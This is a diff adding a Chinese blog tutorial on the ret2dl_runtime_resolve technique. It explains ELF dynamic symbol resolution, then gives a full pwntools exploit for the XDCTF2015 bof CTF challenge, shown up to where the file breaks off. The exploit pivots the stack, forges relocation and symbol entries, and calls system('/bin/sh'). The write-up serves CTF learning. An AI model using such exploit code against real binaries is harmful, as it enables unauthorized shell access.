@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ret2dl_runtime_resovle | 欢迎来到ZYen的小世界！</title><meta name="author" content="ZYen,1193161901@qq.com"><meta name="copyright" content="ZYen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2dl_runtime_resovle 前面已经讲完了PLT和GOT表的作用，在那儿我留了一手，并没有讲清楚_dl_runtime_resolve_这个函数具体实现，还记得当时程序往栈上push了两个参数就进入_dl_runtime_resolve_了吗？不记得可以回去翻下  我们回忆一下当时那两个参数是什么，没错，一个是0，一个是0x804a004，这里先讲他们是啥，0呢，我们先理解成一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl_runtime_resovle">
+<meta property="og:url" content="http://example.com/2021/10/05/ret2dl-runtime-resovle/index.html">
+<meta property="og:site_name" content="欢迎来到ZYen的小世界！">
+<meta property="og:description" content="ret2dl_runtime_resovle 前面已经讲完了PLT和GOT表的作用，在那儿我留了一手，并没有讲清楚_dl_runtime_resolve_这个函数具体实现，还记得当时程序往栈上push了两个参数就进入_dl_runtime_resolve_了吗？不记得可以回去翻下  我们回忆一下当时那两个参数是什么，没错，一个是0，一个是0x804a004，这里先讲他们是啥，0呢，我们先理解成一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-10-05T08:40:22.000Z">
+<meta property="article:modified_time" content="2021-10-05T08:42:11.665Z">
+<meta property="article:author" content="ZYen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/10/05/ret2dl-runtime-resovle/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?[object Object]";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2dl_runtime_resovle',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-05 16:42:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img-blog.csdnimg.cn/59ff1b82a08c4567938e7b522a9607a8.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWlllbjEyMTM4,size_20,color_FFFFFF,t_70,g_se,x_16" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">欢迎来到ZYen的小世界！</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2dl_runtime_resovle</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-05T08:40:22.000Z" title="发表于 2021-10-05 16:40:22">2021-10-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-05T08:42:11.665Z" title="更新于 2021-10-05 16:42:11">2021-10-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2dl_runtime_resovle"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ret2dl-runtime-resovle"><a href="#ret2dl-runtime-resovle" class="headerlink" title="ret2dl_runtime_resovle"></a>ret2dl_runtime_resovle</h1><blockquote>
+<p>前面已经讲完了PLT和GOT表的作用，在那儿我留了一手，并没有讲清楚<code>_dl_runtime_resolve_</code>这个函数具体实现，还记得当时程序往栈上push了两个参数就进入<code>_dl_runtime_resolve_</code>了吗？不记得可以回去翻下</p>
+</blockquote>
+<p>我们回忆一下当时那两个参数是什么，没错，一个是<code>0</code>，一个是<code>0x804a004</code>，这里先讲他们是啥，0呢，我们先理解成一个Index，而<code>0x804a004</code>是一个函数地址叫<code>link_map</code>，其实<code>_dl_runtime_resolve_</code>是通过<code>link_map</code>来找到<code>.dynamic</code>的</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/1.png" class="">
+
+<p>而.<code>dynamic</code>是什么呢？我们随便拉一个程序进IDA来看，我们可以看到里面有一些结构体，其实和<code>_dl_runtime_resolve_</code>紧密相关的只有三个：<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>，<code>DT_JMPREL</code>这三个根据地址我们可以发现它们指向了<code>.dynstr</code>，<code>.dynsym</code>，<code>.rel.plt</code></p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/5.png" class="">
+
+<p><code>link_map+0x8</code>的位置就是它要找的<code>.dynamic</code>，接下来我们再通过<code>.dynamic</code>找到<code>.dynstr</code>， <code>.dynsym</code>，`.rel.plt</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/3.png" class="">
+
+<p><code>.dynstr</code> 的地址是 <code>.dynamic + 0x44 -&gt; 0x0804821c</code></p>
+<p><code>.dynsym</code> 的地址是 <code>.dynamic + 0x4c -&gt; 0x080481cc</code></p>
+<p><code>.rel.plt</code> 的地址是 <code>.dynamic + 0x84 -&gt; 0x08048298</code></p>
+<p>我们看上面的IDA也是这个地址</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/4.png" class="">
+
+<p>到这里另外一个<code>push</code>到栈上的参数就起作用了</p>
+<p>将<code>.rel.plt</code> 的地址加上参数 <code>reloc_arg</code>，即<code>0x8048298+0x0 = 0x8048298</code></p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/6.png" class="">
+
+<p>这里就是重定位表项，这里也是一个结构体，将<code>r_info&gt;&gt;8</code>，即<code>0x00000107&gt;&gt;8 = 1</code>作为<code>.dynsym</code>中的下标</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Addr  r_offset;<span class="comment">//指向GOT表的指针</span></span><br><span class="line"> Elf32_Word  r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/10/05/ret2dl-runtime-resovle/7.png" class="">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Word  st_name; <span class="comment">//符号名偏移，也就是相对.dynstr的偏移</span></span><br><span class="line"> Elf32_Addr  st_value;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Word  st_size;<span class="comment">//该字段为0</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//导入符号，图中是0x12</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Section st_shndx;<span class="comment">//该字段为0</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
+
+<p><code>.dynstr + st_name</code>就是这个函数的符号名字符串 </p>
+<p><code>0x0804821c+0x1a = 0x8048236</code></p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/8.png" class="">
+
+<p>IDA上的字符串表</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/9.png" class="">
+
+<p>最后在动态链接库查找这个函数的地址，并且把地址赋值给<code>rel-&gt;r_offset</code>，即<code>GOT</code>表就可以了</p>
+<p>前面已经讲解完了<code>_dl_runtime_resolve_</code>函数的执行流程，下面从源码层面来解析，不关键的代码已经删除</p>
+<p>在进入<code>_dl_runtime_resolve_</code>函数之后它又<code>call _dl_fixup_</code></p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/10.png" class="">
+
+<p>下面是<code>_dl_fixup_</code>的源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//查找dynstr的位置</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">  <span class="comment">//查找重定位表的位置，这里的reloc_offset是reloc_arg的意思</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">//查找reloc中的r_info结构体成员</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="comment">//判断低位是否为7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">//查找dynstr表中的字符串名字</span></span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">//将对应的函数地址放入GOT表中</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过讲解<code>_dl_runtime_resolve_</code>函数，我们也很容易的想到利用点：</p>
+<p>​    1.通过控制reloc_arg来实现伪造最终获取的函数字符串</p>
+<p>​    2.修改.dynamic内存区域实现伪造最终获取的函数字符串</p>
+<p>​    3.伪造link_map的地址</p>
+<p>用一道经典例题讲解第一种情况</p>
+<h4 id="XDCTF2015-bof"><a href="#XDCTF2015-bof" class="headerlink" title="XDCTF2015_bof"></a>XDCTF2015_bof</h4><p>先看看保护，我们看到开启了<code>Partial RELRO</code>，所以咱修改不了<code>.dynamic</code>，另外还开启了<code>NX</code>保护，也写不了<code>shellcode</code>到栈上</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/12.png" class="">
+
+<p>程序的流程十分的简单，打印出<code>Welcome to XDCTF2015~!</code>，紧接着就是一个溢出函数</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/13.png" class="">
+
+<p>我们按照正常的思路走一遍，一般拿到栈溢出，我们首先就是看有无<code>libc</code>，这题没有给出，然后就是后门函数，<code>system( )</code>函数，<code>/bin/sh</code>字符串，很遗憾都没有，看到这一般都会想到<code>ret2libc</code>，但是当我去查看<code>ROPgadget</code>的时候，发现这个动态链接的文件它的<code>gadget</code>少的离谱，所以<code>ret2libc</code>这条路也走不通了，那只能没有轮子咱们造一个轮子了—-<code>ret2dl_runtime_resovle</code></p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/14.png" class="">
+
+<p>先通过<code>cyclic</code>计算一下溢出的偏移位置</p>
+<img src="/2021/10/05/ret2dl-runtime-resovle/11.png" class="">
+
+
+
+<p>从源码中也可以看出它并没有对<code>reloc_arg</code>参数进行边界校验，导致我们即使传进去的<code>reloc_arg</code>再大，它也不会报错，所以我们就传入一个大的<code>reloc_arg</code>，将重定位表劫持到一个我们可控的地方，比如<code>.bss</code>段，所以很容易就可以想到，通过栈迁移将栈迁移到<code>.bss</code>段</p>
+<p>根据上面的源码，我们可以知道，要构造的有3样东西<code>.rel.plt</code>，<code>.dynstr</code>，<code>.dynsym</code></p>
+<p>我们一步步来，先伪造<code>.rel.plt</code>，<code>.rel.plt</code>有两个结构体成员，第一个是<code>r_offset</code>，为函数的<code>GOT</code>表地址，我们将其填写成<code>write</code>的<code>GOT</code>表地址，第二个是<code>r_info</code>，这个就比较重要了，我们先来回忆一下它是怎么被索引到的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + reloc_arg = r_offset </span><br><span class="line"></span><br><span class="line">r_offset + <span class="number">4</span> = r_info</span><br></pre></td></tr></table></figure>
+
+<p>我们刚刚说到源码中没有对<code>reloc_arg</code>参数进行边界校验，那我们就可以伪造<code>r_offset</code>和<code>r_info</code>到一个我们可控的地方</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + fake_arg = fake_r_offset </span><br><span class="line"></span><br><span class="line">fake_r_offset  + <span class="number">4</span> = fake_r_info</span><br></pre></td></tr></table></figure>
+
+<p>代码如下，我们先不关注<code>(fake_sym_addr - dynsym)/16</code>是什么我们先留个印象，这里为什么要加上7呢？因为要绕过这个<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是<code>.dynsym</code>，它怎么索引到<code>.dynsym</code>的呢，是不是<code>relo_info &gt;&gt; 8</code> 作为<code>.dynsym</code>中的下标，所以我们要在<code>relo_info</code>上做手脚，通过<code>(fake_sym_addr - dynsym)/16</code>来让它索引到<code>fake_dynsym</code>，除于<code>16</code>是因为一个<code>Elf32_Sym</code>大小是<code>16</code>字节，这里还要注意的是要进行对齐！！！</p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br></pre></td></tr></table></figure>
+
+<p>最后就是<code>.dynstr</code>了，这个就很简单了，只需要构造<code>st_name</code>让他找到我们伪造的字符串，它原来是通过<code>.dynstr + st_name</code>来索引的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dynstr + st_name = func_str</span><br><span class="line"></span><br><span class="line">.dynstr + fake_st_name = fake_func_str</span><br></pre></td></tr></table></figure>
+
+<p>代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br></pre></td></tr></table></figure>
+
+<p>完整EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> + stack_size</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">pop_ebp_ret = <span class="number">0x804861b</span></span><br><span class="line">leave_ret = <span class="number">0x8048458</span></span><br><span class="line">link_map = <span class="number">0x8048380</span></span><br><span class="line">dynsym = <span class="number">0x80481d8</span></span><br><span class="line">strtab = <span class="number">0x08048278</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span></span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x08048619</span></span><br><span class="line"><span class="comment">#align = 0x10 - ((bss_addr + 36 - dynsym) % 16) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_esi_pop_edi_pop_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arge</span></span><br><span class="line">fake_relo_addr = bss_addr + <span class="number">28</span></span><br><span class="line">fake_arge = fake_relo_addr - rel_plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#sym</span></span><br><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line"><span class="comment">#relo</span></span><br><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>)+<span class="number">0x7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;relo &quot;</span> + <span class="built_in">hex</span>(relo_info))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str</span></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br><span class="line">bin_sh_addr = bss_addr + <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(link_map)</span><br><span class="line">payload += p32(fake_arge)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p32(relo_offset)</span><br><span class="line">payload += p32(relo_info)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(fake_name)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload))</span><br><span 